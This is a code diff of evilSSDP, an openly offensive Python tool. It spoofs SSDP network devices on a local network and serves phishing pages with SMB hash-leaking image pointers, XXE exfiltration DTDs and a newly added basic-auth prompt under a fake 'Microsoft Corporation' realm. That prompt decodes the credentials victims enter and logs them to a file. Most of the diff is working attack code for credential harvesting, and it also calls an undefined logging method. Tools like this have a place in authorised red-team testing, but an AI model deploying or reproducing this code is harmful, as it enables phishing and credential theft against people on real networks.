@@ -8,7 +8,7 @@ from http.server import HTTPServer
 from email.utils import formatdate
 from time import sleep
 from ipaddress import ip_address
-import os,sys,re,argparse,socket,struct,time,re,socketserver,signal;
+import os,sys,re,argparse,socket,struct,time,re,signal,base64;
 
 banner = r'''
 ___________     .__.__    _________ _________________ __________
@@ -18,50 +18,57 @@ ___________     .__.__    _________ _________________ __________
 /_______  / \_/ |__|____/_______  /_______  //_______  /____|
         \/                      \/        \/         \/
 
-...by initstring
+...by initstring (gitlab.com/initstring)
+Additional contributors: Dwight Hohnstein
 '''
 
 print(banner)
 
-# Set up some nice colors
+#############################           Global Variable Declarations           #############################
 class bcolors:
     GREEN = '\033[92m'
     BLUE = '\033[94m'
     ORANGE = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'
-okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
-noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
-warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
+okBox = bcolors.BLUE +      '[*] ' + bcolors.ENDC
+noteBox = bcolors.GREEN +   '[+] ' + bcolors.ENDC
+warnBox = bcolors.ORANGE +  '[!] ' + bcolors.ENDC
 msearchBox = bcolors.BLUE + '[M-SEARCH]     ' + bcolors.ENDC
 xmlBox = bcolors.GREEN +    '[XML REQUEST]  ' + bcolors.ENDC
-phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC 
-xxeBox = bcolors.RED +      '[XXE VULN!!!!] ' + bcolors.ENDC 
-exfilBox = bcolors.RED +    '[EXFILTRATION] ' + bcolors.ENDC 
+phishBox = bcolors.RED +    '[PHISH HOOKED] ' + bcolors.ENDC
+credsBox = bcolors.RED +    '[CREDS GIVEN]  ' + bcolors.ENDC
+xxeBox = bcolors.RED +      '[XXE VULN!!!!] ' + bcolors.ENDC
+exfilBox = bcolors.RED +    '[EXFILTRATION] ' + bcolors.ENDC
 
-# Handle arguments before moving on....
 parser = argparse.ArgumentParser()
 parser.add_argument('interface', type=str, help='Network interface to listen on.', action='store')
-parser.add_argument('-p', '--port', type=str, help='Port for HTTP server. Defaults to 8888.', action='store')
-parser.add_argument('-t', '--template', type=str, help='Name of a folder in the templates directory. \
-                     Defaults to "password-vault". This will determine xml and phishing pages used."', action='store')
+parser.add_argument('-p', '--port', type=str, default=8888, help='Port for HTTP server. Defaults to 8888.'
+                    , action='store')
+parser.add_argument('-t', '--template', type=str, default='password-vault', help='Name of a folder in the templates \
+                    directory. Defaults to "password-vault". This will determine xml and phishing pages used.'
+                     , action='store')
 parser.add_argument('-s', '--smb', type=str, help='IP address of your SMB server. Defalts to the \
-                     primary address of the "interface" provided.', action='store')
+                    primary address of the "interface" provided.', action='store')
+parser.add_argument('-b', '--basic', default=False, action="store_true", help="Enable base64 authentication for \
+                    templates and write credentials to creds.txt")
+parser.add_argument("-r", "--realm", type=str, default="Microsoft Corporation", help="Realm to appear when prompting \
+                    users for authentication via base64 auth.", action="store")
+parser.add_argument("-u", "--url", type=str, default="", help="Add javascript to the template to redirect from the \
+                    phishing page to the provided URL.", action="store")
 args = parser.parse_args()
 
 interface = args.interface
-if args.port:
-    localPort = int(args.port)
-else:
-    localPort = 8888
+localPort = int(args.port)
+templateDir = os.path.dirname(__file__) + '/templates/' + args.template
+isAuth = args.basic
+realm = args.realm
+redirectUrl = args.url
 
-if args.template:
-    templateDir = os.path.dirname(__file__) + '/templates/' + args.template
-    if not os.path.isdir(templateDir):
-        print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
-        sys.exit()
-else:
-    templateDir = os.path.dirname(__file__) + '/templates/password-vault'
+if not os.path.isdir(templateDir):
+    print(warnBox + "Sorry, that template directory does not exist. Please double-check and try again.")
+    sys.exit()
+#############################         End Global Variable Declarations          #############################
 
 
 class SSDPListener:
@@ -78,11 +85,9 @@ class SSDPListener:
         ssdpPort = 1900			# This is defined by the SSDP spec, do not change
         mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
         serverAddress = ('', ssdpPort)
-        knownHosts = []
         
         # Create the socket
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         # Bind to the server address
         self.sock.bind(serverAddress)
@@ -112,7 +117,8 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
     When used with the 'xxe' template, it will also notify on apps that have potential 0-day XXE vulnerabilities
     in their XML parsing engines. If you see that warning, it may be CVE time!
 
-    Any requests to the HTTP server other than those defined will be given the phishing page.
+    Any requests to the HTTP server other than those defined will be given the phishing page. The phishing page
+    can optionally request an interactive logon if the "-b / --basic" has been specified.
 
     The phishing page the devices SHOULD be requesting is 'present.html' but we will serve it to all requests,
     in case a curious users sees the reference and browses there manually.
@@ -120,57 +126,117 @@ def MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD):
     class DeviceDescriptor(BaseHTTPRequestHandler):
         def do_GET(self):
             localIp,localPort = self.server.server_address
-            if self.path == '/ssdp/device-desc.xml':
+            if self.path == '/ssdp/device-desc.xml':                    # Parsed automatically by all SSDP apps
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write(deviceXML.encode())
-            elif self.path == '/ssdp/service-desc.xml':
+            elif self.path == '/ssdp/service-desc.xml':                 # Not yet implemented
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write(serviceXML.encode())
-            elif self.path == '/ssdp/xxe.html':
+            elif self.path == '/ssdp/xxe.html':                         # Access indicates XXE vulnerability
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write('.'.encode())
-            elif self.path == '/ssdp/data.dtd':
+            elif self.path == '/ssdp/data.dtd':                         # Used for XXE exploitation
                 self.send_response(200)
                 self.send_header('Content-type', 'application/xml')
                 self.end_headers()
                 self.wfile.write(exfilDTD.encode())
             else:
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
+                if isAuth:                                              # If user enables -b/--basic in CLI args
+                    if 'Authorization' not in self.headers:             # If creds not given, ask for them
+                        self.process_authentication()
+                        self.wfile.write("Unauthorized.".encode())
+                    elif 'Basic ' in self.headers['Authorization']:     # Return phishing page after getting creds
+                        self.send_response(200)
+                        self.send_header('Content-type', 'text/html')
+                        self.end_headers()
+                        self.wfile.write(phishPage.encode()) 
+                    else:
+                        self.send_response(500)
+                        self.wfile.write("Something happened.".encode())
+                else:                                                   # Return phishing page for everything else
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    self.wfile.write(phishPage.encode())
+
+        def do_POST(self):
+            if self.path == '/ssdp/do_login.html':                      # For phishing templates to POST creds to
+                self.send_response(301)
+                self.send_header('Location','http://{}:{}/present.html'.format(localIp, localPort))
                 self.end_headers()
-                self.wfile.write(phishPage.encode())
+
+        def process_authentication(self):
+            """
+            Will prompt user for credentials, causing execution to go back to the do_GET funtion for further
+            processing.
+            """
+            self.send_response(401)
+            self.send_header('WWW-Authenticate', 'Basic realm=\"{}\"'.format(realm))
+            self.send_header('Content-type','text/html')
+            self.end_headers()
+
+        def write_log(self, data):
+            """
+            Will append important info to a log file. This includes credentials given via basic auth as well as
+            XXE vulnerabilities.
+            """
+            with open('logs-essdp.txt', 'a') as logFile:
+                timeStamp = formatdate(timeval=None, localtime=True, usegmt=False)
+                logFile.write(timeStamp + ":    " + data + "\n")
+                logFile.close()
     
         def log_message(self, format, *args):
             """
             Overwriting the built in function to provide useful feedback inside the text UI.
             Providing the 'User Agent' is helpful in understanding the types of devices that are interacting
             with evilSSDP.
+
+            The most important stuff (credentials submitted and XXE vulns) are logged to a text file in the
+            working directory.
             """
             address = self.address_string()
-            headers = self.headers['user-agent']
+            agent = self.headers['user-agent']
             verb = self.command
             path = self.path
             if 'xml' in self.path:
-                print(xmlBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print(xmlBox + "Host: {}, User-Agent: {}".format(address, agent))
                 print("               {} {}".format(verb, path))
             elif 'xxe.html' in self.path:
-                print(xxeBox + "Host: {}, User-Agent: {}".format(address, headers))
-                print("               {} {}".format(verb, path))
+                data = xxeBox + "Host: {}, User-Agent: {}\n".format(address, agent)
+                data += "               {} {}".format(verb, path)
+                print(data)
+                self.write_log(data)
+            elif 'do_login' in self.path:
+                contentLength = int(self.headers['Content-Length'])
+                postBody = self.rfile.read(contentLength)
+                credentials = postBody.decode('utf-8')
+                data = credsBox + "HOST: {}, CREDS: {}".format(address, credentials)
+                print(data)
+                self.write_log(data)
             elif 'data.dtd' in self.path:
-                print(xxeBox + "Host: {}, User-Agent: {}".format(address, headers))
-                print("               {} {}".format(verb, path))
+                data = xxeBox + "Host: {}, User-Agent: {}\n".format(address, agent)
+                data += "               {} {}".format(verb, path)
+                print(data)
+                self.write_logfile(data)
             elif 'exfiltrated' in self.path:
-                print(exfilBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print(exfilBox + "Host: {}, User-Agent: {}".format(address, agent))
                 print("               {} {}".format(verb, path))
             else:
-                print(phishBox + "Host: {}, User-Agent: {}".format(address, headers))
+                print(phishBox + "Host: {}, User-Agent: {}".format(address, agent))
                 print("               {} {}".format(verb, path))
+            
+            if 'Authorization' in self.headers:
+                basic, encoded = self.headers['Authorization'].split(" ")
+                plaintext = base64.b64decode(encoded).decode()
+                data = credsBox + "HOST: {}, CREDS: {}".format(address, plaintext)
+                print(data)
+                self.write_log(data)
 
     return DeviceDescriptor 
 
@@ -180,7 +246,7 @@ def get_ip():
     This is used for serving the XML files and also for the SMB pointer, if not specified.
     """
     try:
-        localIp = re.findall(r'inet (.*?)/', os.popen('ip addr show ' + interface).read())[0]
+        localIp = re.findall(r'inet (.*?) ', os.popen('ifconfig ' + interface).read())[0]
     except Exception:
         print(warnBox + "Could not get network interface info. Please check and try again.")
         sys.exit()
@@ -219,9 +285,9 @@ def process_data(listener, data, address):
             requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
         except:
             requestedST = 'ssdp:all'
-        if address[0] not in listener.knownHosts:
+        if (address[0],requestedST) not in listener.knownHosts:
             print(msearchBox + "New Host {}, Service Type: {}".format(remoteIp, requestedST))
-            listener.knownHosts.append(address[0])
+            listener.knownHosts.append((address[0], requestedST))
         send_location(listener, address, requestedST)
 
 def send_location(listener, address, requestedST):
@@ -265,18 +331,22 @@ def buildServiceXML():
     """
     Builds the service descriptor XML file. ***Not yet implemented in evilSSDP***
     """
-    variables = {'localIp': localIp,
-		 'localPort': localPort}
-    fileIn = open(templateDir + '/service.xml')
-    template = Template(fileIn.read())
-    xmlFile = template.substitute(variables)
+    if 'service.xml' in templateDir:
+        variables = {'localIp': localIp,
+                     'localPort': localPort}
+        fileIn = open(templateDir + '/service.xml')
+        template = Template(fileIn.read())
+        xmlFile = template.substitute(variables)
+    else:
+        xmlFile = '.'
     return xmlFile
 
 def buildPhish(smbServer):
     """
     Builds the phishing page served when users open up an evil device.
     """
-    variables = {'smbServer': smbServer}
+    variables = {'smbServer': smbServer,
+                 'redirectUrl': redirectUrl}
     fileIn = open(templateDir + '/present.html')
     template = Template(fileIn.read())
     phishPage = template.substitute(variables)
@@ -301,22 +371,26 @@ def serve_html(deviceXML, serviceXML, phishPage, exfilDTD):
     Starts the web server for delivering XML files and the phishing page.
     """
     HTTPClass = MakeHTTPClass(deviceXML, serviceXML, phishPage, exfilDTD)
-    socketserver.TCPServer.allow_reuse_address = True
+    MultiThreadedHTTPServer.allow_reuse_address = True
     descriptor = MultiThreadedHTTPServer((localIp, localPort), HTTPClass)
     descriptor.serve_forever()
 
 def print_details(smbServer):
     print("\n\n")
     print("########################################")
-    print(okBox + "EVIL TEMPLATE:      {}".format(templateDir))
-    print(okBox + "MSEARCH LISTENER:   {}".format(interface))
-    print(okBox + "DEVICE DESCRIPTOR:  http://{}:{}/ssdp/device-desc.xml".format(localIp, localPort))
-    print(okBox + "SERVICE DESCRIPTOR: http://{}:{}/ssdp/service-desc.xml".format(localIp, localPort))
-    print(okBox + "PHISHING PAGE:      http://{}:{}/ssdp/present.html".format(localIp, localPort))
+    print(okBox + "EVIL TEMPLATE:           {}".format(templateDir))
+    print(okBox + "MSEARCH LISTENER:        {}".format(interface))
+    print(okBox + "DEVICE DESCRIPTOR:       http://{}:{}/ssdp/device-desc.xml".format(localIp, localPort))
+    print(okBox + "SERVICE DESCRIPTOR:      http://{}:{}/ssdp/service-desc.xml".format(localIp, localPort))
+    print(okBox + "PHISHING PAGE:           http://{}:{}/ssdp/present.html".format(localIp, localPort))
+    if redirectUrl:
+        print(okBox + "REDIRECT URL:            {}".format(redirectUrl))
+    if isAuth:
+        print(okBox + "AUTH ENABLED, REALM:     {}".format(realm))
     if 'xxe-exfil' in templateDir:
-        print(okBox + "EXFIL PAGE:         http://{}:{}/ssdp/data.dtd".format(localIp, localPort))
+        print(okBox + "EXFIL PAGE:              http://{}:{}/ssdp/data.dtd".format(localIp, localPort))
     else:
-        print(okBox + "SMB POINTER:        file://///{}/smb/hash.jpg".format(smbServer))
+        print(okBox + "SMB POINTER:             file://///{}/smb/hash.jpg".format(smbServer))
     print("########################################")
     print("\n\n")
 
@@ -332,24 +406,24 @@ def listen_msearch():
 
 def main():
     global localIp
-    localIp = get_ip()
-    smbServer = set_smb()
-    deviceXML = buildDeviceXML(smbServer)
-    serviceXML = buildServiceXML()
-    phishPage = buildPhish(smbServer)
-    exfilDTD = buildExfil()
-    print_details(smbServer)
-    try:
+    localIp = get_ip()                      # Extract IP address of provided interface
+    smbServer = set_smb()                   # Choose which IP we will inject into IMG tags for phishing
+    deviceXML = buildDeviceXML(smbServer)   # Build the primary XML file parsed in all instances
+    serviceXML = buildServiceXML()          # Not yet implemented, may be necessary for advanced future templates
+    phishPage = buildPhish(smbServer)       # Build the phishing page displayed to users who click evil devices
+    exfilDTD = buildExfil()                 # Used in 0-day XXE detection to resolve exfiltration variables
+    print_details(smbServer)                # Provide details of our configuration on the CLI
+    try:                                    # Spawn the web server and SSDP server as separate threads
         webServer = Process(target=serve_html, args=(deviceXML, serviceXML, phishPage, exfilDTD))
         ssdpServer = Process(target=listen_msearch, args=())
         webServer.start()
         ssdpServer.start()
         signal.pause()
-    except (KeyboardInterrupt, SystemExit):
+    except (KeyboardInterrupt, SystemExit): # Allow for a graceful exit when pressing Ctrl-C
         print("\n" + warnBox + "Thanks for playing! Stopping threads and exiting...\n")
         webServer.terminate()
         ssdpServer.terminate()
-        sleep(5)
+        sleep(3)
         sys.exit()
     
 
